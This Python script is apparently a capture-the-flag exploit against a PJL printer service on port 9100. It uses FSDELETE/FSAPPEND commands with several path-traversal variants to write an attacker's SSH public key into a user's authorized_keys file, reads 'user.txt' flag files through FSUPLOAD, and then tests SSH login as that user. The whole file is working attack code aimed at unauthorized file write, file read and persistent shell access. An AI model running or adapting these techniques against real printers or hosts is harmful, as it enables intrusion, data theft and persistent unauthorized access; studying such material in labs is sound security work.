#!/usr/bin/env python3
"""Stepwise PJL (recv between lines) + path escape variants."""
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)


def step_write(path: str, data: bytes) -> None:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    try:
        s.sendall(f'@PJL FSDELETE NAME="{path}"\r\n'.encode())
        print("del", repr(s.recv(256)))
        s.sendall(f'@PJL FSAPPEND NAME="{path}"\r\n'.encode())
        print("name", repr(s.recv(256)))
        s.sendall(f"SIZE={len(data)}\r\n".encode())
        print("size", repr(s.recv(256)))
        s.sendall(data)
        try:
            print("body", repr(s.recv(256)))
        except socket.timeout:
            print("body T")
    finally:
        s.close()


def step_read(path: str, size: int) -> None:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    try:
        s.sendall(f'@PJL FSUPLOAD NAME="{path}"\r\n'.encode())
        print("rname", repr(s.recv(512)))
        s.sendall(b"OFFSET=0\r\n")
        print("roff", repr(s.recv(512)))
        s.sendall(f"SIZE={size}\r\n".encode())
        print("rsize", repr(s.recv(512)))
        buf = b""
        try:
            while len(buf) < size + 64:
                c = s.recv(4096)
                if not c:
                    break
                buf += c
        except socket.timeout:
            pass
        print(f"READ {path!r} len={len(buf)} data={buf[:120]!r}")
    finally:
        s.close()


def one_upload(path: str) -> None:
    payload = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        print(f"1shot {path!r}", repr(s.recv(512)))
    except socket.timeout:
        print(f"1shot {path!r} T")
    s.close()


KEY_PATHS = [
    "/home/archivist/.ssh/authorized_keys",
    "../.ssh/authorized_keys",
    "logs/../../.ssh/authorized_keys",
    "....//....//home/archivist/.ssh/authorized_keys",
    ".ssh/authorized_keys",
]

FLAG_PATHS = [
    "../user.txt",
    "/home/archivist/user.txt",
    "....//....//home/archivist/user.txt",
    "logs/../../user.txt",
]

print("=== stepwise KEY ===")
for p in KEY_PATHS[:3]:
    step_write(p, KEY)

print("\n=== one-shot abs path ===")
one_upload("/home/archivist/.ssh/authorized_keys")

print("\n=== stepwise READ flag ===")
for p in FLAG_PATHS:
    step_read(p, 40)

print("\n=== ssh ===")
cp = subprocess.run(
    [
        "ssh",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-i",
        "/tmp/id_ed25519",
        "archivist@127.0.0.1",
        "id",
    ],
    capture_output=True,
    text=True,
    timeout=10,
)
print(cp.returncode, cp.stdout, cp.stderr[:160])